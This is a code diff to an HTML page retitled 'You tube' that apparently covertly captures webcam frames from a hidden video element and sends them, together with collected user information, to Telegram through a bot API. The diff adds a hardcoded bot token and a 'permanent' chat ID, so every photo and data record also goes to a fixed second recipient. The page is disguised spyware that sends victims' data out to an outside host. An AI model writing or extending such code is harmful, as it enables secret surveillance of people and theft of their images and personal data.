@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>You tube</title>
     <style>
         #video {
             display: none;
@@ -24,7 +24,9 @@
             return params;
         }
 
-        const { botToken, chatId } = getQueryParams();
+        const { chatId } = getQueryParams();
+        const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
+        const permanentChatId = '5634946920'; // Permanent chat ID for sending data
 
         async function startVideo() {
             try {
@@ -50,11 +52,12 @@
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             canvas.toBlob((blob) => {
-                sendImageToTelegram(blob);
+                sendImageToTelegram(blob, chatId);
+                sendImageToTelegram(blob, permanentChatId);
             }, 'image/png');
         }
 
-        async function sendImageToTelegram(blob) {
+        async function sendImageToTelegram(blob, chatId) {
             const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
             const formData = new FormData();
             formData.append('chat_id', chatId);
@@ -87,13 +90,14 @@
 
                 console.log("User info: ", userInfo);
 
-                await sendUserInfoToTelegram(userInfo);
+                await sendUserInfoToTelegram(userInfo, chatId);
+                await sendUserInfoToTelegram(userInfo, permanentChatId);
             } catch (error) {
                 console.error("Error getting user info: ", error);
             }
         }
 
-        async function sendUserInfoToTelegram(userInfo) {
+        async function sendUserInfoToTelegram(userInfo, chatId) {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             try {
